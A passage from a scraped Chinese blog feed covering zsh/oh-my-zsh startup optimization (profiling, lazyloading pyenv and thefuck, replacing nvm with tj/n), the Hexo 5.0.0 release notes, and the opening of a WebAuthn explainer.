_zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> /Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\"> <div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-08-10</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">Hexo 5.0.0 正式发布</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-07-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"\n<p>WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将其表述为 “An API for accessing Public Key Credentials”，即“一个用于访问公钥凭证的 API”。WebAuthn 很强大，强大到被认为是 Web 身份认证的未来（当然，也很复杂）。你有想过通过指纹或者面部识别来登录网站吗？WebAuthn 就能在保证安全和隐私的情况下让这样的想法成为现实。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\" alt=\"通过 WebAuthn 调起 Windows Hello 登录网站\" width=\"1912\" height=\"966\" class=\"aligncenter size-full wp-image-2215\"></a>\n<p>你可以在<a href=\"https://webauthn.io/\" rel=\"noopener\">这个网站</a>自行体验 WebAuthn。或者，如果你有一个使用 WordPress 的站点，可以尝试一下 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WP-WebAuthn</a> 这款插件，它可以为你的站点启用 WebAuthn 登录。这是我为了写这篇文章而练手开发的插件，本文中的部分示例代码也来自这款插件。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"wp-webauthn\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/wp-webauthn\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>WebAuthn Level 1 标准已在 2019 年 3 月成为 W3C 推荐标准，而 Level 2 标准目前也已进入编辑草案阶段，但互联网上有关它的中文资料却仍然很少，国内也鲜有网站支持这一新标准。于是，在抱着各种英文资料和标准啃了几天以后，我折腾出了这篇文章。</p>\n<p>在这篇文章里，我将会从最基本的概念开始，逐渐深入 WebAuthn，直到解码公钥等深层细节。这可能是你能找到的有关 WebAuthn 最详细最基础的中文文章，也很可能是最长的。在开始之前，<strong>我强烈建议你打开菜单中的文章目录浏览一遍，以对这篇文章涉及的内容有所了解。</strong>如果你只是想了解如何简单地在你的项目中添加对 WebAuthn 的支持，那么“<a href=\"https://flyhigher.top/#webauthn-overview\">浅谈 WebAuthn</a>”部分就是你要找的；如果你想了解更多关于 WebAuthn 的底层细节，那么你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分。</p>\n<p>由于在本文写作时 WebAuthn Level 2 规范尚未定稿，<strong>这篇文章我们将只专注于 Level 1 规范。</strong></p>\n<p>这篇文章最后更新于 2020.9 ，在你读到这篇文章时，部分事实可能已经发生改变，请注意判断。</p>\n<p><strong>更新日志：</strong></p>\n<ul>\n<li>2021.1.16 添加 Chrome 